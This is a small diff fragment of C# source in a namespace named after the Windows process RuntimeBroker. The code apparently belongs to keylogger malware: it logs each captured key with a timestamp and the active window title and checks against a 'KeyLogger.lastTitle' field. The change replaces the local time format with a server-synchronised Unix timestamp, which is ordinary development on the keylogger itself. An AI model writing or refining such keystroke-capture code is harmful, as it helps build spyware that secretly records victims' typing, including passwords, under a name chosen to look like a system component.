@@ -1595,7 +1595,7 @@ namespace RuntimeBroker
 
                 Dictionary<string, string> props = new Dictionary<string, string>();
                 props["Key"] = key;
-                props["Time"] = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt");
+                props["Time"] = ServerTimeHelper.GetUnixTimeSeconds() + "";// DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt");
                 props["Window"] = title.ToString();
                 if (props["Window"] != KeyLogger.lastTitle) 
                 {
